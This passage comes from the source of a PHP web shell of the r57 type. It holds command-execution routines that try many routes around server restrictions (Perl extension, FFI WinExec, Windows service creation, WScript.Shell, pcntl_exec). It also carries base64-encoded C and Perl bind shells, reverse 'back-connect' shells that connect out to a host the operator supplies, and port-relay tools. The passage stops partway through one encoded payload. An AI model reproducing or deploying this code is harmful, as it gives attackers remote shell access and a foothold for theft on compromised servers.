    while(!@feof($pipes[1])) {$res .= @fgets($pipes[1], 1024);}
   }
   @proc_close($f);
  }
 }else{$res = safe_ex($cfe);}
 return htmlspecialchars($res);
}


function safe_ex($cfe)
{global $unix,$tempdir;
 $res = '';
 if (!empty($cfe))
 {
   if(extension_loaded('perl')){
     @ob_start();
     $safeperl=new perl();
     $safeperl->eval("system('$cfe')");
     $res = @ob_get_contents();
     @ob_end_clean();
   }
   elseif(!$unix && extension_loaded('ffi')) 
   {
     $output=$tempdir.uniqid('NJ');
     $api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
     if(!@function_exists('escapeshellarg')){$res=$api->WinExec("cmd.exe /c $cfe >\"$output\"",0);}
     else{$res=$api->WinExec("cmd.exe /c ".@escapeshellarg($cfe)." >\"$output\"",0);}
     while(!@file_exists($output))sleep(1);
     $res=moreread($output);
     @unlink($output);
   }
   elseif(!$unix && extension_loaded('win32service'))
   {
     $output=$tempdir.uniqid('NJ');
     $n_ser=uniqid('NJ');
     if(!@function_exists('escapeshellarg'))
     {@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\windows\\system32\\cmd.exe','params'=>"/c $cfe >\"$output\""));}
     else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\windows\\system32\\cmd.exe','params'=>"/c ".@escapeshellarg($cfe)." >\"$output\""));}
     @win32_start_service($n_ser);
     @win32_stop_service($n_ser);
     @win32_delete_service($n_ser);
     while(!@file_exists($output))sleep(1);
     $res=moreread($output);
     @unlink($output);
   }
   elseif(!$unix && extension_loaded("win32std"))
   {
     $output=$tempdir.uniqid('NJ');
     if(!@function_exists('escapeshellarg')){@win_shell_execute('..\..\..\..\..\..\..\windows\system32\cmd.exe /c '.$cfe.' > "'.$output.'"');}
     else{@win_shell_execute('..\..\..\..\..\..\..\windows\system32\cmd.exe /c '.@escapeshellarg($cfe).' > "'.$output.'"');}
     while(!@file_exists($output))sleep(1);
     $res=moreread($output);
     @unlink($output);
   }
   elseif(!$unix)
   {
     $output=$tempdir.uniqid('NJ');
     $suntzu = new COM("WScript.Shell"); 
     if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\windows\system32\cmd.exe /c '.$cfe.' > "'.$output.'"');}
     else{$suntzu->Run('c:\windows\system32\cmd.exe /c '.@escapeshellarg($cfe).' > "'.$output.'"');}
     $res=moreread($output);
     @unlink($output);
   }
   elseif(@function_exists('pcntl_exec') && @function_exists('pcntl_fork'))
   {
    $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
    $output=$tempdir.uniqid('pcntl');
    $pid = @pcntl_fork();
    if ($pid == -1) {
     $res .= '[-] Could not children fork. Exit';
    } else if ($pid) {
         if (@pcntl_wifexited($status)){$res .= '[+] Done! Command "'.$cfe.'" successfully executed.';}
         else {$res .= '[-] Error. Command incorrect.';}
    } else {
         $cfe = array(" -e 'system(\"$cfe > $output\")'");
         if(@pcntl_exec('/usr/bin/perl',$cfe)) exit(0);
         if(@pcntl_exec('/usr/local/bin/perl',$cfe)) exit(0);
         die();
    }
    $res=moreread($output);
    @unlink($output);
   }
/*   elseif(1)
   {
     
   }
*/
 }
 return htmlspecialchars($res);
}

function get_users($filename)
{
  $users = $rows = array();
  $rows=@explode("\n",moreread($filename));
  if(!$rows[0]){$rows=@explode("\n",readzlib($filename));}
  if(!$rows[0]) return 0;
  foreach ($rows as $string)
   {
   $user = @explode(":",trim($string));
   if(substr($string,0,1)!='#') array_push($users,$user[0]);
   }
  return $users; 
}
function err($n,$txt='')
{
echo '<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#333333><font color=red face=Verdana size=-2><div align=center><b>';
echo $GLOBALS['lang'][$GLOBALS['language'].'_err'.$n];
if(!empty($txt)) { echo " $txt"; }
echo '</b></div></font></td></tr></table>';
return null;
}
function perms($mode)
{
if (!$GLOBALS['unix']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value,$checked=0)
{
 $ret = "<input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\"";
 if($checked) $ret .= " checked";
 return $ret.">";
}
function which($pr)
{
$path = '';
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return false; }
}
function ps($pr)
{global $unix;
$path = '';
if($unix){$path = ex("ps -aux | grep $pr | grep -v 'grep'");}
else{$path = ex("tasklist | findstr \"$pr\"");}
if(!empty($path)) { return $path; } else { return false; }
}
function locate($pr)
{
$path = '';
$path = ex("locate $pr");
if(!empty($path)) { return $path; } else { return false; }
}
function cf($fname,$text)
{
 if(!morewrite($fname,@base64_decode($text))){err(0);};
}
function sr($l,$t1,$t2)
 {
 return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
